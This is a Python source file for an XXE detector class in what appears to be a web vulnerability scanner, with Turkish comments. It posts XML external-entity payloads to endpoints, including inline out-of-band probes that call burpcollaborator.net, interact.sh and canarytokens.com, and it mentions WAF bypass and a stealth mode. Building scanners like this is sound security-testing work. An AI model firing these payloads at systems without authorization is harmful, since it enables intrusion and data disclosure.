from ..core.base_detector import BaseDetector
from ..payloads.nuclei_patterns import XXE_INDICATORS, XXE_PAYLOADS


class XXEDetector(BaseDetector):
    """Nuclei-inspired XXE tespiti — OOB, DTD, blind, WAF-bypass."""

    def __init__(self, session=None, timeout=10, ai_engine=None, mode='fast', custom_payloads=None, stealth=True):
        super().__init__(session, timeout, ai_engine, mode, custom_payloads, stealth)
        self.payloads = XXE_PAYLOADS

    def _test_oob_xxe(self, endpoint):
        """Out-of-band XXE testi (blind XXE)."""
        oob_payloads = [
            '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://burpcollaborator.net">]><foo>&xxe;</foo>''',
            '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://interact.sh">]><foo>&xxe;</foo>''',
            '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://canarytokens.com">]><foo>&xxe;</foo>''',
        ]
        results = []
        for payload in oob_payloads:
            try:
                headers = {'Content-Type': 'application/xml', 'Accept': '*/*'}
                resp = self.session.post(
                    endpoint['url'], data=payload, headers=headers,
                    timeout=self.timeout, allow_redirects=True,
                )
                # OOB XXE genellikle 200 döndürür ama içerik değişmez
                if resp.status_code == 200:
                    results.append(self._make_result(
                        'xxe', endpoint['url'], 'body', 'OOB-XXE', 'low', 'oob-xxe',
                        hint='Out-of-band XXE payload gönderildi — interact.sh/collaborator ile doğrulayın',
                    ))
                    break
            except Exception:
                continue
        return results

    def test(self, endpoint):
        results = []
        if not endpoint:
            return results

        url = endpoint.get('url')
        if not url:
            return results

        content_types = [
            'application/xml',
            'text/xml',
            'application/xhtml+xml',
            'application/soap+xml',
        ]

        for payload in self.payloads:
            for ct in content_types:
                try:
                    headers = {
                        'Content-Type': ct,
                        'Accept': '*/*',
                    }
                    method = endpoint.get('method', 'POST')
                    if method == 'POST':
                        resp = self.session.post(
                            url, data=payload, headers=headers,
                            timeout=self.timeout, allow_redirects=True,
                        )
                    else:
                        resp = self.session.request(
                            method, url, data=payload, headers=headers,
                            timeout=self.timeout, allow_redirects=True,
                        )

                    if self._is_waf_blocking(resp):
                        continue

                    indicator = self.analyzer.match_any(resp.text, XXE_INDICATORS)
                    if indicator:
                        results.append(self._make_result(
                            'xxe', url, 'body', payload[:80] + '...', 'high', 'entity-expansion',
                            hint=f'XXE göstergesi ({indicator}) — Burp ile XML endpoint\'ini manuel test edin',
                            indicator=indicator,
                        ))
                        return results

                    if 'DOCTYPE' in resp.text or 'ENTITY' in resp.text:
                        results.append(self._make_result(
                            'xxe', url, 'body', payload[:80] + '...', 'low', 'xml-echo',
                            hint='XML yapısı yansıyor — XXE payload\'ları ile manuel test edin',
                        ))
                        return results

                except Exception:
                    continue

        # GET parametrelerinde XXE
        if endpoint.get('params'):
            for param in endpoint['params']:
                for payload in self.payloads[:5]:
                    try:
                        resp, _, test_url = self._request_get(endpoint, param, payload)
                        if self._is_waf_blocking(resp):
                            continue
                        indicator = self.analyzer.match_any(resp.text, XXE_INDICATORS)
                        if indicator:
                            results.append(self._make_result(
                                'xxe', test_url, param, payload[:80] + '...', 'medium', 'param-xxe',
                                hint=f'Parametre üzerinden XXE sinyali ({indicator})',
                            ))
                            return results
                    except Exception:
                        continue

        # OOB XXE test
        oob_results = self._test_oob_xxe(endpoint)
        results.extend(oob_results)

        return results
